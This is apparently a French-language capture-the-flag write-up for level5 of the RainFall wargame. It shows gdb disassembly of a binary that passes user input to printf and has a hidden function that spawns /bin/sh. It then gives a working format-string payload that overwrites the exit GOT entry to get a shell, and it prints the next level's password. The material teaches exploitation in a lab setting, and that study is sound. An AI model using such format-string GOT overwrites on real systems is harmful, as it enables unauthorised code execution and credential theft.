## Analyse

```(gdb) disas main
Dump of assembler code for function main:
   0x08048504 <+0>:	push   ebp
   0x08048505 <+1>:	mov    ebp,esp
   0x08048507 <+3>:	and    esp,0xfffffff0
   0x0804850a <+6>:	call   0x80484c2 <n>
   0x0804850f <+11>:	leave  
   0x08048510 <+12>:	ret    
End of assembler dump.
(gdb) info functions
All defined functions:
(gdb) disas main
Dump of assembler code for function main:
   0x08048504 <+0>:	push   ebp
   0x08048505 <+1>:	mov    ebp,esp
   0x08048507 <+3>:	and    esp,0xfffffff0
   0x0804850a <+6>:	call   0x80484c2 <n>
   0x0804850f <+11>:	leave  
   0x08048510 <+12>:	ret    
End of assembler dump.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048334  _init
0x08048380  printf
0x08048380  printf@plt
0x08048390  _exit
0x08048390  _exit@plt
0x080483a0  fgets
0x080483a0  fgets@plt
0x080483b0  system
0x080483b0  system@plt
0x080483c0  __gmon_start__
0x080483c0  __gmon_start__@plt
0x080483d0  exit
0x080483d0  exit@plt
0x080483e0  __libc_start_main
0x080483e0  __libc_start_main@plt
0x080483f0  _start
0x08048420  __do_global_dtors_aux
0x08048480  frame_dummy
0x080484a4  o
0x080484c2  n
0x08048504  main
0x08048520  __libc_csu_init
0x08048590  __libc_csu_fini
0x08048592  __i686.get_pc_thunk.bx
0x080485a0  __do_global_ctors_aux
0x080485cc  _fini
(gdb) disas n
Dump of assembler code for function n:
   0x080484c2 <+0>:	push   ebp
   0x080484c3 <+1>:	mov    ebp,esp
   0x080484c5 <+3>:	sub    esp,0x218
   0x080484cb <+9>:	mov    eax,ds:0x8049848
   0x080484d0 <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x080484d4 <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x080484dc <+26>:	lea    eax,[ebp-0x208]
   0x080484e2 <+32>:	mov    DWORD PTR [esp],eax
   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:	lea    eax,[ebp-0x208]
   0x080484f0 <+46>:	mov    DWORD PTR [esp],eax
   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
   0x080484f8 <+54>:	mov    DWORD PTR [esp],0x1
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
End of assembler dump.
(gdb) disas o
Dump of assembler code for function o:
   0x080484a4 <+0>:	push   ebp
   0x080484a5 <+1>:	mov    ebp,esp
   0x080484a7 <+3>:	sub    esp,0x18
   0x080484aa <+6>:	mov    DWORD PTR [esp],0x80485f0
   0x080484b1 <+13>:	call   0x80483b0 <system@plt>
   0x080484b6 <+18>:	mov    DWORD PTR [esp],0x1
   0x080484bd <+25>:	call   0x8048390 <_exit@plt>
End of assembler dump.
(gdb) x/s 0x80485f0
0x80485f0:	 "/bin/sh"

```

## Exploit

L'attaque ici est une autre attaque par chaîne de format. Mais cette fois, nous devons rediriger la fonction exit vers une autre fonction cachée o. Pour ce faire, nous pouvons utiliser la GOT (Global Offset Table). La Global Offset Table est une table d'adresses de fonctions qui sont liées de manière dynamique et est utilisée pour résoudre l'adresse d'une fonction à l'exécution. Tout ce que nous avons à faire est de trouver le décalage, trouver l'adresse de `exit`, `o`, et injecter notre valeur dans la fonction `printf`.

```(gdb) disas o
Dump of assembler code for function o:
   0x080484a4 <+0>:    push   ebp
   0x080484a5 <+1>:    mov    ebp,esp
   0x080484a7 <+3>:    sub    esp,0x18
   0x080484aa <+6>:    mov    DWORD PTR [esp],0x80485f0
   0x080484b1 <+13>:   call   0x80483b0 <system@plt>
   0x080484b6 <+18>:   mov    DWORD PTR [esp],0x1
   0x080484bd <+25>:   call   0x8048390 <_exit@plt>
End of assembler dump.
```

```(gdb) disas 0x80483d0
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:    jmp    DWORD PTR ds:0x8049838 <===
   0x080483d6 <+6>:    push   0x28
   0x080483db <+11>:   jmp    0x8048370
End of assembler dump.

```

```level5@RainFall:~$ ./level5 
AAAA %p %p %p %p %p %p %p %p %p %p
AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070
```

- Adresse de `exit`: `0x8049838`
- Adresse de `o`: `0x080484a4`
- Offset: 4

On convertit l'adresse de `o` en decimal puis on osustrait l'offset pour savoir combien d'octets on doit ecrire pour atteindre exit `exit` GOT entry.

```
(python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"'; cat) | ./level5
[...snip...]
whoami
level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```